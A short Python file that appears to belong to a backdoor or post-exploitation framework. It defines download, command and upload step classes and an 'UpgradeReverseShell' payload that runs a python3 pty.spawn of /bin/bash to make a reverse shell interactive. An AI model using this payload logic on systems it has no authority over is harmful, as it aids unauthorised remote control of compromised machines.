


# A payload is a series of steps that are executed in order to achieve a goal.
# 

class Step:
    def __init__(self, name):
        self.name = name
    def get_name(self):
        return self.name
class DownloadStep(Step):
    def __init__(self, name, filename):
        super().__init__(name)
        self.filename = filename
    def get_filename(self):
        return self.filename
class CommandStep(Step):
    def __init__(self, name, command):
        super().__init__(name)
        self.command = command
    def get_command(self):
        return self.command

class UploadStep(Step):
    def __init__(self, name, source, destination):
        super().__init__(name)
        self.source = source
        self.destination = destination
    def get_source(self):
        return self.source
    def get_destination(self):
        return self.destination
    
class Payload:
    #returns a list of steps
    async def build(self, backdoor) -> list:
        pass
    

class UpgradeReverseShell(Payload):
    async def build(self, backdoor):
        steps = []
        steps.append(CommandStep("Execute", "/bin/python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"))
        return steps